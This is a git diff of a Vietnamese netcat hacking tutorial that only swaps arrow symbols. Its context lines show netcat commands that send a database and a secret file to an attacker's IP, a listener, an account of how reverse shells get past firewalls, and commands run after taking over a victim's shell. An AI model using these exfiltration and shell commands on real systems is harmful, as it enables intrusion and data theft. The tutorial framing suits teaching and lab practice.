@@ -41,7 +41,7 @@ nc -lvnp 4444
 nc [IP_Của_Máy_A] 4444
 ```
 
-> **Kết quả:** Gõ chữ bên A $\rightarrow$ hiện bên B. Gõ bên B $\rightarrow$ hiện bên A.
+> **Kết quả:** Gõ chữ bên A → hiện bên B. Gõ bên B → hiện bên A.
 > *Ứng dụng:* Hacker dùng cách này để giao tiếp bí mật trong mạng nội bộ mà không cần cài Zalo hay Messenger.
 
 -----
@@ -83,12 +83,12 @@ nc [IP_Hacker] 4444 < database.sql
 ### 1\. Bind Shell (Mở cửa mời vào)
 
   * **Cơ chế:** Nạn nhân mở cổng (VD: 4444). Hacker kết nối tới IP Nạn nhân:4444.
-  * **Nhược điểm:** Tường lửa (Firewall/NAT) thường **CHẶN** các kết nối từ ngoài Internet chui vào mạng nội bộ. $\rightarrow$ Kỹ thuật này thường thất bại.
+  * **Nhược điểm:** Tường lửa (Firewall/NAT) thường **CHẶN** các kết nối từ ngoài Internet chui vào mạng nội bộ. → Kỹ thuật này thường thất bại.
 
 ### 2\. Reverse Shell (Gọi điện về nhà) - *Hacker ưa dùng*
 
   * **Cơ chế:** Hacker mở cổng chờ sẵn. Nạn nhân (do dính mã độc) sẽ **TỰ KẾT NỐI NGƯỢC** ra ngoài tới máy Hacker.
-  * **Ưu điểm:** Tường lửa thường **THẢ** cho nhân viên trong công ty truy cập Internet ra ngoài (Outbound traffic). $\rightarrow$ Dễ dàng vượt qua tường lửa.
+  * **Ưu điểm:** Tường lửa thường **THẢ** cho nhân viên trong công ty truy cập Internet ra ngoài (Outbound traffic). → Dễ dàng vượt qua tường lửa.
 
 ### 🔥 Thực hành Reverse Shell
 
@@ -250,9 +250,9 @@ Nhìn vào màn hình Hacker, nếu thấy dòng chữ này xuất hiện:
 
 Bây giờ Terminal của Hacker chính là Terminal của Nạn nhân. Hãy thử gõ:
 
-1.  **`whoami`** $\rightarrow$ Xem bạn đang đăng nhập với tư cách ai (root hay user thường?).
-2.  **`pwd`** $\rightarrow$ Xem bạn đang đứng ở thư mục nào.
-3.  **`ls -la`** $\rightarrow$ Liệt kê toàn bộ file.
+1.  **`whoami`** → Xem bạn đang đăng nhập với tư cách ai (root hay user thường?).
+2.  **`pwd`** → Xem bạn đang đứng ở thư mục nào.
+3.  **`ls -la`** → Liệt kê toàn bộ file.
 
 -----
 
@@ -283,7 +283,7 @@ nc 192.168.1.10 5555 < secret.txt
   * Quay lại Terminal Mới của Hacker.
   * Bấm `Ctrl + C` để ngắt kết nối.
   * Gõ `cat file_an_cap.txt`.
-  * Nếu thấy nội dung "Mat khau la 123" $\rightarrow$ **Mission Complete\!**
+  * Nếu thấy nội dung "Mat khau la 123" → **Mission Complete\!**
 
 -----
 
